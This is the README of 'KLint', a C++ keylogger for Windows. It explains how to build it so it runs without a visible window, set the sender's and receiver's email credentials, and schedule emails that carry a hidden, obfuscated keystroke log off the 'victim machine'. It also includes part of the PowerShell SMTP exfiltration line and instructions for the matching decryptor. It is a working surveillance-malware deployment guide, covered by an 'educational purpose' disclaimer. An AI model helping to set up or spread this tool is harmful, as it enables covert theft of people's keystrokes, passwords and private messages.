# KLint 
**CPP KeyLogger**<br /><br />
**KLint** captures keyboard key strokes using system hooks [**Based on Windows API**]. The keystrokes are written to a encrypted log file 
hidden under the windows filesystem tree and the log file is sent to the target via email after paticular time intervals as defined in **KeyHooks.h**<br />
In current version **v0.01** only keystroke recording is supported but soon screenshots, audio recording and much more will be added. <br /><br />

## Disclaimer
ANY MALICIOUS USE OF THE CONTENTS FROM THIS PROJECT WILL NOT HOLD THE AUTHOR RESPONSIBLE, THE CONTENTS ARE SOLELY FOR EDUCATIONAL PURPOSE

<br >
Table of Contents
=================

   * [Setup](#setup)
   * [Configuring The Keylogger](#configuration)
        * [Email Setup](#email-setup)
        * [Additional Params](#additional-parameters)
   * [Encryption](#encryption)
   * [Decryption](#decryption)
        * [Klint Decryptor](#Klint-Decryptor)


## Setup
Download the repository using either bash or the browser

```
git clone https://github.com/shaiq-dev/Klint.git
```

The keylogger is created in **CodeBlocks**, however any IDE supporting C++ can be used to build or modify the project. The CodeBlocks project files are included with this repo. <br />
For any other IDE directly add all the files to a new project. <br /><br />
**Prerequisites**

```

* C++11 standards must be enabled and if using GCC compilter, -mwindows flag needs to be checked
* Addtionally -static flag maybe need to bundle all the dependencies with the exe that are required during runtime

```
    
## Configuration
For current version all the configurations are directly done to the source code. This will be changed in upcoming versions

### Email Setup
Default email configuration is set for **Gmail**. For email setup you need to configure 3 Macros in ***Sender.h*** in ..\KLint\Klint\Sender.h on ***Line 40*** <br />
```
    #define X_EM_TO "receiver@mail.com"
    #define X_EM_FROM "sender@mail.com"
    #define X_EM_PASS "sender password"
```
**X_EM_TO**       &#9;:&#9;Your destination email <br />
**X_EM_FROM**     &#9;:&#9;Your Source email   <br />
**X_EM_PASS**     &#9;:&#9;Source email password   <br />

* **For Gmail Users**

    * To send the emails successfully from the victim machine turn on "Allow  LESS SECURE APPS" from [here]("https://myaccount.google.com/lesssecureapps")<br />
    * Alternatively to be on the safer side you can use "APP PASSWORDS"
    from [here]("https://myaccount.google.com/apppasswords"), but to use this you need to enable 2 factor authentication
    *   Learn more about app passwords on Google [support]("https://support.google.com/accounts/answer/185833?hl=en")<br />

*   **Other Mail Providers**

    Open ***Sender.h*** and goto **Line 69**
    ```
    $Srv = \"smtp.gmail.com\" "
    ```
    Change **smtp.gmail.com** with the mail server of your email provider and edith **Line 78**
    ```
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    ```
    Change **587** with your mail server port number


### Additional Parameters

To change the *time interval* for sending emails, there is a macro in ***KeyHooks.h*** in ..\KLint\Klint\KeyHooks.h on ***Line 17*** <br />
```
#define X_EM_SEMA 30000
```
That default value is *30000* which represents _30_ seconds or _30000 milliseconds_. Any value here should be given in milliseconds<br /><br />

## Encryption

The keylogger uses [BASE64]("https://en.wikipedia.org/wiki/Base64") encryption, as it is easy to decrypt so i have added some modification to the original algorithim. <br />
If you want to change the algorithim to fit your needs goto ___Base64.h___ located at _.\KLint\Klint\Base64.h_ and change the __SALTS__ and do the custom modifications to the following function on __Line 29__
```
 std::string encryptB64(std::string s) 
```
Any modifications made here shall also be made with the [decryptor](#decryption) in the reverse fashion. <br />
You can also change the whole algorithim to fit your needs
<br /><br />

## Decryption

The logs are decrypted using the same BASE64 algorithim and all the modifications made in the __BASE64.h__ are reversed here. The decryptor is located at 
```
..\KLint\Klint Decryptor\Klint-dcrypt\main.cpp
```
Any modifications made with the encryptor shall be reverted here but in reverse fashion. All the modifications shall be done with the below function located at __Line 69__
```
std::string DecryptB64(std::string s)
```

### KLint Decryptor

The ___exe___ version of the klint decryptor is already bundled with this project and can be used to decrypt the log files. It is located at
```
...\KLint\Klint Decryptor\Klint-dcrypt\bin\Debug\Klint-dcrypt.exe
```
**Usage** <br />

The __klint-dcrypt.exe__ can be run from the Windows command Line, it requires two parameters, input and the output file.
```
CMD > .\klint-dcrypt.exe "InputFile.log" "OutputFile.log"
```  

## License
This project is licensed under the MIT License, see the [LICENSE](License.md) file for more details
